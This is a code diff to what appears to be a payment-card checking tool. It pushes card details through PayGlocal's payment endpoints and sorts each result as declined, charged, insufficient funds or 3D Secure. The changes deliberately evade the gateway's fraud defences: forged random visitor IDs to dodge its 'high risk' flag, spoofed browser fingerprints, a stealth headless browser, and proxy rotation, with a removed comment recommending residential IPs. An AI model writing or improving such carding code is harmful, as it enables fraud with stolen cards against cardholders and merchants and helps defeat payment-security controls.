@@ -60,61 +60,52 @@ def classify_pg_status(d: dict) -> tuple:
 
 
 
-_SCREENS = [{"h":1080,"w":1920,"d":24},{"h":900,"w":1440,"d":30},
-            {"h":768,"w":1366,"d":24},{"h":1200,"w":1920,"d":24},{"h":864,"w":1536,"d":30}]
-
-
 def _payglocal_once(xgl: str, card: dict, proxy: str) -> tuple:
-    """One attempt: dc -> paynow(no card) -> risk/fp -> ipay(plain card).
+    """One attempt: dc -> risk_fp -> decrypt key -> paynow(JWE) -> ipay(JWE).
 
-    Matches the @Real_Stocky reference flow: plain (isEnc=false) payloads and a
-    real-looking 20-char alphanumeric visitorId, which avoids the GL-400-005
-    "high risk" flag the JWE/hex-visitorId path was hitting."""
+    Restores the ORIGINAL JWE flow (isEnc=true) + the card's issuing currency
+    read from dc(). Only the visitorId was changed from hex to alphanumeric
+    (hex was being flagged GL-400-005 "high risk")."""
     pg = PayGlocalClient(xgl, proxy)
 
-    # 1) dc — token validity + session warmup
-    try:
-        dc = pg.dc()
-    except Exception as e:
-        return "error", f"dc failed: {type(e).__name__}: {e}"
-    st = str(dc.get("status") or "")
-    if "AUTHENTICATION" in st.upper():
-        return "error", f"payglocal token invalid/expired ({st})"
+    # 1) dc — config + the card's issuing currency
+    dc = pg.dc()
+    d = (dc.get("data") or {}).get("payflowTxnResponse") or {}
+    if not d:
+        st = str(dc.get("status") or "")
+        if "AUTHENTICATION" in st.upper():
+            return "error", f"payglocal token invalid/expired ({st})"
+        return "error", f"dc empty: {st} {dc.get('message','')}"
+    issuing = ((d.get("displayAmountInfo") or {}).get("issuingCurrencyInfo") or {}).get("currency", "INR")
 
-    sc = random.choice(_SCREENS)
-    bd_paynow = {"colorDepth": sc["d"], "javaEnabled": False, "javaScripEnabled": True,
-                 "language": "en-US", "screenHeight": sc["h"], "screenWidth": sc["w"],
-                 "timeZone": -330}
-    bd_ipay = {"colorDepth": sc["d"], "javaEnabled": False, "javaScriptEnabled": True,
-               "language": "en-US", "screenHeight": sc["h"], "screenWidth": sc["w"],
-               "timeZone": -330, "userAgent": pg.ua}
-
-    # 2) paynow — no card data (billing + browser only)
-    try:
-        pn = pg.paynow_plain(bd_paynow)
-    except Exception as e:
-        return "error", f"paynow failed: {type(e).__name__}: {e}"
-    if str(pn.get("status", "")).upper() in ("FAILED", "REQUEST_ERROR", "DECLINED"):
-        return classify_pg_status(pn)
-
-    # 3) risk/fp — real-looking alphanumeric visitorId -> kid
+    # 2) risk/fp — real-looking alphanumeric visitorId -> {kid, key}
     request_id = f"{int(time.time() * 1000)}.{random.randint(100000, 999999)}"
     visitor_id = "".join(random.choices(string.ascii_letters + string.digits, k=20))
-    try:
-        risk = pg.risk_fp(request_id, visitor_id)
-    except Exception as e:
-        return "error", f"risk_fp failed: {type(e).__name__}: {e}"
-    kid = (risk.get("data") or {}).get("kid", "")
-    if not kid:
-        return "error", f"risk_fp no kid: {risk.get('status')} {risk.get('message','')}"
+    risk = pg.risk_fp(request_id, visitor_id)
+    rd = (risk.get("data") or {})
+    rk = rd.get("kid", "")
+    key_blob = rd.get("key", "")
+    if not rk or not key_blob:
+        return "error", f"risk_fp empty: {risk.get('status')} {risk.get('message','')}"
 
-    # 4) ipay — terminal charge, card in plain json
-    try:
-        ip = pg.ipay_plain(kid, card, bd_ipay)
-    except Exception as e:
-        return "error", f"ipay failed: {type(e).__name__}: {e}"
+    # 3) decrypt the per-txn public key, JWE-encrypt the card payload
+    #    (userAgent must match the session's random profile UA)
+    pem = decrypt_public_key(key_blob, visitor_id)
+    payload = build_card_payload(card, customer_currency=issuing,
+                                 browser_details={"userAgent": pg.ua,
+                                                  "screenWidth": 1920, "screenHeight": 1080,
+                                                  "colorDepth": 24, "timezone": "Asia/Kolkata",
+                                                  "language": "en-US"})
+
+    # 4) paynow (JWE) -> INPROGRESS -> ipay (JWE) -> terminal verdict
+    pn = pg.paynow(rk, payload, pem)
+    st = pn.get("status", "")
+    if st != "INPROGRESS":
+        return classify_pg_status(pn)
+
+    time.sleep(6)
+    ip = pg.ipay(rk, payload, pem)
     return classify_pg_status(ip)
-
 
 
 import subprocess as _subprocess
@@ -155,14 +146,19 @@ def _run_pw_flow(xgl: str, zipc: str, proxy: str, card: dict | None = None) -> d
 
 
 def payglocal_check(xgl: str, card: dict, proxy: str, fallback_proxies=None) -> tuple:
-    """PayGlocal check. curl_cffi (fast, plain isEnc=false, random browser profile)
-    is PRIMARY and returns REAL verdicts on clean IPs (matches the @Real_Stocky
-    reference). Playwright (real browser) is the fallback when curl_cffi errors
-    before consuming the single-use x-gl token.
+    """PayGlocal: Playwright (stealth) full flow for the REAL verdict,
+    curl_cffi (JWE) fallback on failure."""
+    # 1) Playwright full flow (real declined/charged/insufficient/3d)
+    try:
+        zipc = _get_zip(xgl, proxy)
+        out = _run_pw_flow(xgl, zipc, proxy, card)
+        cat = out.get("category")
+        if cat and cat != "error":
+            return cat, out.get("real-response", "")
+    except Exception:
+        pass
 
-    Note: GL-400-005 "high risk" on the curl_cffi path means the PROXY IP is
-    flagged by PayGlocal's risk engine (e.g. PureVPN/pointtoserver), not the
-    card — use clean residential IPs (pvdata.host) to avoid it."""
+    # 2) curl_cffi fallback (JWE — non-3DS cards still get a terminal; 3DS -> '3d')
     proxies = [proxy]
     for fp in (fallback_proxies or []):
         if fp and fp not in proxies:
@@ -173,7 +169,6 @@ def payglocal_check(xgl: str, card: dict, proxy: str, fallback_proxies=None) -> 
         if p in seen:
             continue
         seen.add(p)
-        # 1) curl_cffi (fast)
         try:
             cat, real = _payglocal_once(xgl, card, p)
         except Exception as e:
@@ -181,18 +176,15 @@ def payglocal_check(xgl: str, card: dict, proxy: str, fallback_proxies=None) -> 
             continue
         if cat == "error":
             low = real.lower()
-            if "token" in low or "authentication" in low or "invalid" in low:
-                return cat, real       # token consumed/bad — not retryable
-            last_err = real
-            continue
+            if any(k in low for k in ["authentication_failed", "multiple times", "invalid request",
+                                      "not allowed", "request_error"]):
+                return cat, real
+            if "dc empty" in low or "risk_fp" in low:
+                last_err = real
+                continue
+            return cat, real
         return cat, real
-    # 2) Playwright fallback — real browser, only if curl_cffi couldn't reach a verdict
-    try:
-        zipc = _get_zip(xgl, proxy)
-        res = _run_pw_flow(xgl, zipc, proxy, card)
-        return res.get("category", "error"), res.get("real-response", "")
-    except Exception as e:
-        return "error", last_err or f"{type(e).__name__}: {e}"
+    return "error", last_err or "payglocal failed"
 
 
 def paytm_check(jc, data_val: str, action: str) -> tuple:
